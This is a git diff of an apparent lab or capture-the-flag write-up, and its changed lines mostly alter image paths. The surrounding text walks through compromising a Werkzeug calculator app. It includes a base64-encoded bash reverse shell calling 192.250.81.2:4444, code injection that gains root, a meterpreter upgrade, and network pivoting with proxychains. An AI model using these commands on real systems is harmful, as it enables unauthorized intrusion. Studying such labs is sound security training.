@@ -41,13 +41,13 @@ There is an Apache 2.4.29 HTTP server running on Port 80
 
 Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed
 
-![](<../../../../.gitbook/assets/image (7) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (7) (1) (1) (1).png>)
 
 Looks like there's another web server running something called Werkzeug (version 1.0.1) built with Python 2.7.17
 
 There's also a Git repository and an online calculator. So probably the project can be found here
 
-![](<../../../../.gitbook/assets/image (37) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (37) (1) (1) (1).png>)
 
 According to this [article](https://testdriven.io/blog/what-is-werkzeug/):
 
@@ -63,7 +63,7 @@ Let us explore each of these services beginning with port 80
 
 Port 5000 hosts the actual online calculator
 
-![](<../../../../.gitbook/assets/image (21) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (21) (1) (1) (1).png>)
 
 There's an error message when visiting port 8000
 
@@ -79,7 +79,7 @@ When you visit /.git itself, you receive an error
 
 However, visiting .git/config gives you a file to download
 
-![](<../../../../.gitbook/assets/image (38) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (38) (1) (1) (1) (1).png>)
 
 And its file content is interesting
 
@@ -95,7 +95,7 @@ Nothing interesting on port 80
 
 Nothing interesting on port 5000 either
 
-![](<../../../../.gitbook/assets/image (33) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (33) (1) (1) (1).png>)
 
 Now we have something interesting!
 
@@ -103,7 +103,7 @@ Now we have something interesting!
 
 We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN
 
-![](<../../../../.gitbook/assets/image (55) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (55) (1) (1) (1) (1) (1).png>)
 
 It doesn't allow unauthenticated access and so far we haven't found a PIN number anywhere.
 
@@ -153,7 +153,7 @@ Let's check the other commit difference
 git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
 ```
 
-![](<../../../../.gitbook/assets/image (20) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (20) (1) (1) (1) (1).png>)
 
 Essentially what was added seems to be user-input sanitation via the isValid function
 
@@ -206,7 +206,7 @@ echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
 ```
 
-![](<../../../../.gitbook/assets/image (17) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (17) (1) (1) (1) (1).png>)
 
 Start a netcat listener
 
@@ -226,7 +226,7 @@ Now we'll paste the payload in the textbox of the calculator webapp and press th
 
 ![](<../../../../.gitbook/assets/image (50) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (19) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (19) (1) (1) (1).png>)
 
 Nice, we've got a reverse shell session that is root!
 
@@ -240,7 +240,7 @@ find / -name flag
 
 ![](<../../../../.gitbook/assets/image (9) (1) (1).png>)
 
-![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22) (1) (1) (1) (1).png>)
+![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22) (1) (1) (1) (1) (1).png>)
 
 The shell that we have is pretty limited, so it would be in our best interest to gain a meterpreter shell
 
@@ -291,11 +291,11 @@ ifconfig
 
 As we see, we have the compromised machine IP as well as the second machine that was inaccessible to us before: `192.218.10.2`
 
-![](<../../../../.gitbook/assets/image (29) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (29) (1) (1) (1) (1).png>)
 
 We will now add this route
 
-![](<../../../../.gitbook/assets/image (18) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (18) (1) (1) (1) (1).png>)
 
 Now we need to determine what services are on this second network that we have discovered. We will use a basic TCP port scanner to look for ports
 
@@ -323,7 +323,7 @@ So why use proxychains? This [article ](https://medium.com/swlh/proxying-like-a-
 
 Using a socks proxy can be understood from [this](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0) article and [this](https://nullsweep.com/pivot-cheatsheet-for-pentesters/) other one
 
-![](<../../../../.gitbook/assets/image (29) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (29) (1) (1) (1).png>)
 
 ```
 proxychains nmap -sT -P0 192.218.10.2
